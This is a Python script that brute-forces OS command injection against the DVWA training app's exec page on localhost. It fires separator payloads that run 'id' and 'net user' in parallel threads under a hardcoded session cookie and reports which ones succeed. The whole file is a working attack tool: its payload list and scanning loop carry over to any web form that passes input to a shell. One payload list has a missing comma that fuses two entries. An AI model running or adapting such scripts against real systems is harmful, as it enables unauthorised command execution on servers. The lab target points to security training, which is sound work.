#encoding: utf-8

import re
from concurrent.futures.thread import ThreadPoolExecutor
import itertools

import requests

WORKERS = 10


def injection(data):
    addr, headers, payload = data
    url = 'http://{0}:{1}/DVWA-1.9/vulnerabilities/exec/'.format(*addr)
    name = payload['name']
    pattern = payload['pattern']
    for pld in payload['payloads']:
        params = {
            'ip' : pld,
            'Submit' : 'Submit',
        }
        response = requests.post(url, params, headers=headers)
        if response.ok and re.search(pattern, response.text, re.I):
            return True, name, pld
    return False, name, None


def main(addr, headers):
    payloads = [
        {
            'name' : 'id',
            'pattern' : r'uid=\d',
            'payloads' : [
                '127.0.0.1;id;',
                '127.0.0.1&&id', '127.0.0.1&;&id',
                '127.0.0.1&id', '127.0.0.1|id',
                'testcmdinjection||id', 'testcmdinjection|;|id',
                'testcmdinjection|id', 'testcmdinjection&id',
            ]
        },
        {
            'name' : 'netuser',
            'pattern' : r'administrator',
            'payloads' : [
                'testcmdinjection||net user', 'testcmdinjection|;|net user',
                'testcmdinjection|net user', 'testcmdinjection&net user',
                '127.0.0.1&&net user', '127.0.0.1&;&net user'
                '127.0.0.1&net user', '127.0.0.1|net user',
            ]
        },

    ]
    datas = itertools.product([addr], [headers], payloads)
    executor = ThreadPoolExecutor(max_workers=WORKERS)
    for success, name, payload in executor.map(injection, datas):
        if success:
            print('+ name:', name, ', payload:', payload)


if __name__ == '__main__':
    server = ('localhost', 80, )
    headers = {
        'Cookie' : 'security=medium; PHPSESSID=u91gorbk6d5j4de6ehrf2t3953',
    }
    main(server, headers)
